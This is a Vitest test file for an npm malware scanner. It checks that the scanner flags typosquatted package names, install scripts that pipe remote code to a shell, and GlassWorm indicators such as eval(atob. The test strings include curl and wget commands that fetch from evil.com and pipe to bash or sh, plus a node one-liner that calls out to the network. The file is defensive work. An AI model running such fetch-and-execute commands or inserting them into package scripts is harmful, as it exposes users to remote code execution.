import { describe, it, expect } from "vitest";
import {
  FILE_PATTERNS,
  MALICIOUS_PACKAGE_PATTERNS,
  SUSPICIOUS_SCRIPTS,
} from "../patterns.js";

describe("npm Scanner Patterns", () => {
  describe("Malicious package name detection", () => {
    it("should match known typosquatting names", () => {
      const typosquats = ["lodas", "l0dash", "crossenv", "babelcli"];

      for (const name of typosquats) {
        const matches = MALICIOUS_PACKAGE_PATTERNS.some((pattern) =>
          new RegExp(pattern).test(name),
        );
        expect(matches).toBe(true);
      }
    });

    it("should not flag common legitimate packages", () => {
      const legitimate = [
        "express",
        "react",
        "lodash",
        "typescript",
        "vitest",
        "commander",
      ];

      for (const name of legitimate) {
        const matches = MALICIOUS_PACKAGE_PATTERNS.some((pattern) =>
          new RegExp(pattern).test(name),
        );
        expect(matches).toBe(false);
      }
    });

    it("should match very long single-word package names", () => {
      const suspiciousName = "abcdefghijklmnopqrstuvwxyz";
      const matches = MALICIOUS_PACKAGE_PATTERNS.some((pattern) =>
        new RegExp(pattern).test(suspiciousName),
      );
      expect(matches).toBe(true);
    });
  });

  describe("Suspicious script patterns", () => {
    it("should detect curl pipe to bash", () => {
      const script = "curl https://evil.com/payload.sh | bash";
      const matches = SUSPICIOUS_SCRIPTS.some((pattern) =>
        new RegExp(pattern.pattern, "i").test(script),
      );
      expect(matches).toBe(true);
    });

    it("should detect wget pipe to sh", () => {
      const script = "wget https://evil.com/run.sh | sh";
      const matches = SUSPICIOUS_SCRIPTS.some((pattern) =>
        new RegExp(pattern.pattern, "i").test(script),
      );
      expect(matches).toBe(true);
    });

    it("should detect node -e with network access", () => {
      const script = `node -e "require('https').get('https://evil.com')"`;
      const matches = SUSPICIOUS_SCRIPTS.some((pattern) =>
        new RegExp(pattern.pattern, "i").test(script),
      );
      expect(matches).toBe(true);
    });

    it("should detect base64 in scripts", () => {
      const script = "node -e 'Buffer.from(\"dGVzdA==\", \"base64\")'";
      const matches = SUSPICIOUS_SCRIPTS.some((pattern) =>
        new RegExp(pattern.pattern, "i").test(script),
      );
      expect(matches).toBe(true);
    });

    it("should not flag common build scripts", () => {
      const safeScripts = [
        "tsc",
        "node dist/index.js",
        "npm run build",
        "echo done",
        "rimraf dist",
      ];

      for (const script of safeScripts) {
        const matches = SUSPICIOUS_SCRIPTS.some((pattern) =>
          new RegExp(pattern.pattern, "i").test(script),
        );
        expect(matches).toBe(false);
      }
    });
  });

  describe("Pattern coverage", () => {
    it("should have patterns for all critical GlassWorm IOCs", () => {
      // Verify we have patterns for the key GlassWorm indicators
      const criticalPatterns = [
        "lzcdrtfxyqiplpd",    // marker
        "eval\\s*\\(\\s*atob", // eval(atob
        "eval\\s*\\(\\s*Buffer\\.from", // eval(Buffer.from
        "new\\s+Function\\s*\\(\\s*atob", // new Function(atob
      ];

      const allPatterns = SUSPICIOUS_SCRIPTS.map((p) => p.pattern).join("|");
      const filePatterns = FILE_PATTERNS.map(
        (p: { pattern: string }) => p.pattern,
      ).join("|");
      const combined = allPatterns + "|" + filePatterns;

      for (const critical of criticalPatterns) {
        // Check that at least the substring exists in our patterns
        expect(combined).toContain(critical.replace(/\\\\/g, "\\"));
      }
    });

    it("should assign correct severity levels", () => {
      // All eval/exec encoded patterns should be critical or high
      const evalPatterns = SUSPICIOUS_SCRIPTS.filter(
        (p) =>
          p.pattern.includes("curl") ||
          p.pattern.includes("wget"),
      );
      for (const p of evalPatterns) {
        expect(["critical", "high"]).toContain(p.severity);
      }
    });
  });
});
